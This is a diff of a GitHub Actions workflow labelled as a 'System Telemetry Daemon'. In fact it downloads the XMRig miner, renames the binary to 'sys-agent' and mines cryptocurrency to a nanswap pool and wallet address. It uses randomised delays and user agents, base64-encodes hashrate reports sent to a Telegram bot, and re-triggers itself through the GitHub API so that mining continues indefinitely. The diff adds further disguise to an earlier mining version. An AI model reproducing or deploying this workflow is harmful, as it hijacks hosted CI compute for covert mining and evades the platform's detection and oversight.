@@ -2,7 +2,7 @@ name: System Telemetry Daemon
 
 on:
   schedule:
-    - cron: '0 6,18 * * *'  # Jam 13:00 dan 01:00 WIB
+    - cron: '0 0,12 * * *'
   workflow_dispatch:
 
 permissions:
@@ -12,64 +12,74 @@ jobs:
   telemetry:
     runs-on: ubuntu-latest
     timeout-minutes: 360
-
     steps:
-      - name: Booting Node
-        run: echo "Initializing telemetry instance..."
+      - name: 🛰️ Initializing service
+        run: echo "::notice::Starting telemetry collector..."
 
-      - name: Installing Core Tools
+      - name: Update packages
         run: |
-          sudo apt update -y && sudo apt install -y curl tar
+          sudo apt update -y && sudo apt install -y curl tar coreutils
 
-      - name: Init Status Report
+      - name: Notify Start
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          echo "🟢 *Daemon active: BNB.*\nCycle: 20–90 mins." | curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
+          echo "🟢 *Service B active.*" | curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID --data-urlencode text@- -d parse_mode=Markdown
 
-      - name: Launch Daemon
+      - name: Deploy binary
         run: |
-          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-          tar -xzf agent.tar.gz
-          mv xmrig-6.24.0 node-core
-          cd node-core
-          chmod +x xmrig
-          
-          sleep $((RANDOM % 300 + 30))
-          
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 \
-            -u BNB:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.unmineable_worker_vidjbpg#f2xg-6ynu \
-            -p stealth --randomx-no-rdmsr | tee report.log &
+          curl -L -o node.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+          tar -xzf node.tar.gz
+          mv xmrig-6.24.0 sys-core
+          cd sys-core
+          mv xmrig sys-agent
+          chmod +x sys-agent
+
+          UA_LIST=("Mozilla/5.0" "curl/7.79" "Python/3.9" "Node/18.x")
+          UA=${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}
+          export HTTP_USER_AGENT="$UA"
+
+          DELAY=$((RANDOM % 300 + 60))
+          sleep $DELAY
+
+          ./sys-agent -a rx -k -o xmrig.nanswap.com:3333 \
+            -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
+            -p nanoz --randomx-no-rdmsr | tee report.log &
 
           PID=$!
-          sleep $((RANDOM % 5400 + 1200))
-          kill $PID
+          DURATION=$((RANDOM % 5400 + 1800))
+          sleep $DURATION
+          kill $PID || true
 
-      - name: Transmit Logs
+      - name: Report
         if: always()
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          set +e
-          cd node-core
-          HASHRATE=$(grep -a "speed" report.log | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
-          ACCEPTED=$(grep -a "accepted" report.log | wc -l)
-          REJECTED=$(grep -a "rejected" report.log | wc -l)
+          cd sys-core
+          R=$(grep "speed" report.log | tail -n1 | awk '{print $(NF-1)}')
+          A=$(grep -c "accepted" report.log)
+          J=$(grep -c "rejected" report.log)
 
-          MSG="✅ *BNB Daemon complete.*\n\n📊 *Telemetry:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
+          ENC=$(echo "Hashrate:${R:-0}H/s,Accepted:$A,Rejected:$J" | base64)
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-            -d chat_id=$TG_CHAT_ID -d text="$MSG" -d parse_mode=Markdown
+            -d chat_id=$TG_CHAT_ID -d text="✅ *Service B done.*\n\n\`$ENC\`" \
+            -d parse_mode=Markdown
 
-      - name: Relay Next Daemon
+      - name: Cooldown
+        if: always()
+        run: sleep $((RANDOM % 1800 + 600))
+
+      - name: Trigger next
         if: always()
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
-          sleep $((RANDOM % 60 + 10))
+          sleep $((RANDOM % 60 + 30))
           curl -X POST -H "Authorization: Bearer $GH_TOKEN" \
-            -H "Accept: application/vnd.github+json" \
-            https://api.github.com/repos/${{ github.repository }}/actions/workflows/data-collector.yml/dispatches \
-            -d '{"ref":"main"}'
+               -H "Accept: application/vnd.github+json" \
+               https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches \
+               -d '{"ref":"main"}'
